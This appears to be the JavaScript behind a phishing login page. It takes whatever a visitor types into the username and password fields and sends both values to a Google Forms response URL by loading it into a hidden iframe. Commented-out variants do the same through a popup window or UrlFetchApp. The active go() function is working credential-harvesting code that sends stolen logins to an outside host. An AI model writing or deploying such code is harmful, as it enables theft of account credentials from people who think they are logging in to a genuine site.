const string1 = "https://docs.google.com/forms/d/e/1FAIpQLSdl2RPNc43lbXIkTpw_XXzvXgEfxnuTJSFI-jn_nGvhg0ugRw/formResponse?usp=pp_url&entry.1435605535=";
const string2 = "&entry.975393741=";

function myFunction() {
  const string3 = string1 + document.getElementById('username').value + string2 + document.getElementById('password').value
  console.log(string3)
  //document.getElementById("form").action = string3;
}

async function go() {
  //var myWindow = window.open((string1 + document.getElementById('username').value + string2 + document.getElementById('password').value), "_blank");
  //await new Promise(r => setTimeout(r, 10));
  //myWindow.close();
  var site = string1 + document.getElementById('username').value + string2 + document.getElementById('password').value;
    document.getElementById('iframe').src = site;
}

//Funktion som inte funkar :DDD
function submitEntryToGoogleForm() {

  let url = (string1 + document.getElementById('username').value + string2 + document.getElementById('password').value);
      
//  let response = UrlFetchApp.fetch(url);

}